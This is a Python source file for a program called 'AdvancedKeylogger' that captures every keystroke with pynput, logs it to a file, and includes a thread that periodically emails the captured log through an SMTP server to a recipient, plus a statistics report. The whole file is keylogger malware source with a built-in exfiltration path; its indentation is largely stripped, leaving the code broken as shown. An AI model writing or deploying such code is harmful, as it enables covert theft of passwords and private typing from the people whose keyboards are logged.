import pynput 
from pynput.keyboard import Key, Listener 
import logging 
import os 
import time 
from datetime import datetime 
import smtplib 
from email.mime.text import MIMEText 
from email.mime.multipart import MIMEMultipart 
import threading 
 
class AdvancedKeylogger: 
    def __init__(self, log_file="keylog.txt", email_interval=3600): 
self.log_file = log_file 
self.email_interval = email_interval  
self.start_time = datetime.now() 
self.keys_pressed = [] 
# Set up logging 
logging.basicConfig( 
filename=log_file, 
level=logging.DEBUG, 
format='%(asctime)s: %(message)s' 
) 
def on_press(self, key): 
try: 
# Log regular keys 
logging.info(str(key)) 
self.keys_pressed.append(str(key)) 
except AttributeError: 
# Log special keys 
if key == Key.space: 
logging.info(' ') 
self.keys_pressed.append(' ') 
elif key == Key.enter: 
logging.info('\n') 
self.keys_pressed.append('\n') 
else: 
logging.info(f'[{str(key)}]') 
self.keys_pressed.append(f'[{str(key)}]') 
def on_release(self, key): 
# Stop the keylogger when ESC is pressed 
if key == Key.esc: 
return False 
def start(self): 
# Create a listener thread 
with Listener(on_press=self.on_press, on_release=self.on_release) as listener: 
# Start a thread for periodic email reports 
if self.email_interval > 0: 
email_thread = threading.Thread(target=self.periodic_email_report) 
email_thread.daemon = True 
email_thread.start() 
listener.join() 
def periodic_email_report(self): 
"""Send email reports periodically""" 
while True: 
time.sleep(self.email_interval) 
self.send_email_report() 
def send_email_report(self, smtp_server="smtp.gmail.com", smtp_port=587, 
sender_email="", sender_password="",  
recipient_email=""): 
"""Send the keylog via email""" 
try: 
# Read the log file 
with open(self.log_file, 'r') as file: 
log_content = file.read() 
# Create email 
message = MIMEMultipart() 
message["From"] = sender_email 
message["To"] = recipient_email 
message["Subject"] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}" 
# Add body to email 
body = f"Keylogger Report\n\nTime Period: {self.start_time} to {datetime.now()}\n\n" 
body += "Logged Keys:\n" + log_content 
message.attach(MIMEText(body, "plain")) 
# Connect to SMTP server and send email 
with smtplib.SMTP(smtp_server, smtp_port) as server: 
server.starttls() 
server.login(sender_email, sender_password) 
server.sendmail(sender_email, recipient_email, message.as_string()) 
print(f"Email report sent to {recipient_email}") 
except Exception as e: 
print(f"Error sending email: {str(e)}") 
def get_statistics(self): 
"""Generate statistics about the logged keys""" 
if not os.path.exists(self.log_file): 
return "No log file found." 
with open(self.log_file, 'r') as file: 
content = file.read() 
# Count total keystrokes 
total_keys = len(content.split('\n')) 
# Count special keys 
special_keys = content.count('[') 
# Count spaces 
spaces = content.count(' ') 
# Calculate runtime 
runtime = datetime.now() - self.start_time 
stats = f""" 
Keylogger Statistics 
=================== 
Total Keystrokes: {total_keys} 
Special Keys: {special_keys} 
Spaces: {spaces} 
Runtime: {runtime} 
Log File: {self.log_file} 
""" 
return stats 
if __name__ == "__main__": 
# Create and start the keylogger 
keylogger = AdvancedKeylogger(log_file="keylog.txt", email_interval=0) 
print("Advanced Keylogger Started") 
print("Press ESC to stop the keylogger") 
try: 
keylogger.start() 
except KeyboardInterrupt: 
print("\nKeylogger stopped by user") 
    # Print statistics when stopped 
    print(keylogger.get_statistics())
